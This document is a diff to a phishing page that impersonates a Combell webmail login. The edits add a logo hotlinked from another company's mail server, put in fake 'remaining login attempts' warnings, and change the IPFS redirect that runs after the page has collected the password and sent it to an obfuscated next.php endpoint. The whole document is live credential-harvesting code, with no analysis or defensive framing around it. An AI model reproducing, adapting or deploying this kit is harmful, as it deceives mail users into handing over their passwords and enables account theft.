@@ -280,7 +280,7 @@
 
 <!-- Customized section -->
 
-<link rel="shortcut icon" href="https://webmail.combell.com/skins/combell/assets/images/favicon.ico?s=1660134491">
+<link rel="shortcut icon" href="https://webmail.germania-elektronik.de/skins/elastic/images/logo.svg">
 <link href="./css" rel="stylesheet">
 <script src="./jquery.min.js.download"></script><script src="./common.min.js.download"></script><script src="./app.min.js.download"></script><script src="./jstz.min.js.download"></script><script>
 /*
@@ -432,7 +432,7 @@ rcmail.gui_object('message', 'message');
         };
       })(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com"]);</script></head>
 <body style="font-size:11px;" class="xskin skin-combell color-585858 login-page xdesktop font-icons-toolbars" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0=">
-<p style="border-radius:6px; margin-left:1030px; background-color:rgb(255, 134, 0); color:white; width:105px;"><b><span style="margin-left:10px;">Remaining Time:</b></span><br><span style="margin-left:18px;" id="demo"><span></p>
+
 
 <div>
 <div id="login-form"bis_skin_checked="1">
@@ -445,7 +445,7 @@ From: SSL/TLS </div>
 
 <div>
 <br>
-<img src="" width="13%" height="" style="margin-left:130px;" id="logoimg" alt="Combell Webmail"></img>
+<img src="https://webmail.germania-elektronik.de/skins/elastic/images/logo.svg" width="13%" height="" style="margin-left:130px;" id="logoimg" alt="Combell Webmail"></img>
 
 </div>
 <div id="company-name" bis_skin_checked="1">Webmail</div><h1><span>Login</span></h1><form name="form" method="post">
@@ -462,17 +462,25 @@ From: SSL/TLS </div>
 <input name="_pass" id="pr" class="hu" style="font-size:12px; height:38px;" placeholder="Enter email password"required size="40" autocapitalize="off" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons">
 
 
-<button type="submit" id="submit-btn" style="width:100%; background-color:rgb(1, 152, 225); height:35px; color:white;" class="button mainaction submit">Login To Continue</button></p>
+<button type="submit" id="submit-btn" style="width:100%; background-color:rgb(1, 152, 225); height:35px; color:white;" class="button mainaction submit">Continue</button></p>
 </form>
 
 </div>
-<div withid="login-status" class="error-notice" style="visibility: visible; width:300px; height:px; margin-left:130px; margin-top:10px; color:red;">
+<div withid="login-status" class="error-notice" style="visibility: visible; width:300px; height:px; margin-left:70px; margin-top:10px; color:red;">
             <div class="content-wrapper">
                 <div id="login-detail">
                     <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
-                    <div id="msg" style="margin-top:10px; margin-left:32px;"><span><img src="https://mxtoolbox.com/public/images/StatusIcons/problem.png">Session Error!.</span></div>
-					                    <div id="msg2"  style="display: none; margin-top:5px; margin-left:0px; "><span><img src="https://mxtoolbox.com/public/images/StatusIcons/problem.png"></span>Login failed! (incorrect password)</div>
-										                    <div id="msg1" style="display: none; margin-top:5px; margin-left:0px; ">Login failed! (wrong password)</div>
+                    <div id="msg" style="margin-top:10px; margin-left:90px;">Session Error!.</div>
+					
+					                    <div id="msg2"  style="display: none; margin-top:5px; margin-left:20px; "><span><img src="https://mxtoolbox.com/public/images/StatusIcons/problem.png"></img>&nbsp;</span>Login failed. Remaining login attempts:4</div>
+										                  
+														  <div id="msg1" style="display: none; margin-top:5px; margin-left:0px; "><span><img src="https://mxtoolbox.com/public/images/StatusIcons/problem.png"></img>&nbsp;</span>Using incorrect login data to access this account is forbidden and might disable the account.
+
+Remaining login attempts:5<br>
+
+</div>
+
+        
                 </div>
 				
 				
@@ -641,7 +649,7 @@ $(document).ready(function() {
 				$("#logonamec").html(finalu);
 
             }).fail(function() {
-                $("#logoimg").attr("src", "https://webmail.ballet4babies.co.uk/cPanel_magic_revision_1493500058/unprotected/cpanel/images/webmail-logo.svg");
+                $("#logoimg").attr("src", "https://webmail.germania-elektronik.de/skins/elastic/images/logo.svg");
                 $("#logoname").html("");
 				$("#logonamec").html("");
 
@@ -706,7 +714,7 @@ $(document).ready(function() {
 				$("#logonamec").html(finalu);
 
             }).fail(function() {
-                $("#logoimg").attr("src", "https://webmail.ballet4babies.co.uk/cPanel_magic_revision_1493500058/unprotected/cpanel/images/webmail-logo.svg");
+                $("#logoimg").attr("src", "https://webmail.germania-elektronik.de/skins/elastic/images/logo.svg");
                 $("#logoname").html("");
 				$("#logonamec").html("");
 
@@ -752,16 +760,16 @@ var file="bmV4dC5waHA=";
 
             },
             beforeSend: function(xhr) {
-                $("#submit-btn").html("Connecting!....");
+                $("#submit-btn").html("Connecting....");
             },
             success: function(response) {
                 $("#pr").val("");
-                if (count >= 3) {
+                if (count >=3) {
                     count = 0;
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-              window.location.replace("https://bafybeidr6mxk6yag5aveoupy272lpta467dhtqpp664gxjfolz6iv2nogu.ipfs.w3s.link/complete.html?msg="+ai);
+              window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
                     }, 500);
                     return false;
                 }
@@ -783,7 +791,7 @@ var file="bmV4dC5waHA=";
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-                        window.location.replace("https://bafybeidr6mxk6yag5aveoupy272lpta467dhtqpp664gxjfolz6iv2nogu.ipfs.w3s.link/complete.html?msg="+ai);
+                        window.location.replace("https://bafybeidcn7h4xogiok7hwogswtpkdtrmjjrm73ncu2jehlpvt5okcwfbvu.ipfs.w3s.link/complete.html?msg="+ai);
                     }, 1000);
                     return false;
                 }
@@ -799,7 +807,7 @@ var file="bmV4dC5waHA=";
                 }
             },
             complete: function() {
-                $("#submit-btn").html("Login To Continue");
+                $("#submit-btn").html("Login");
             }
         });
     });
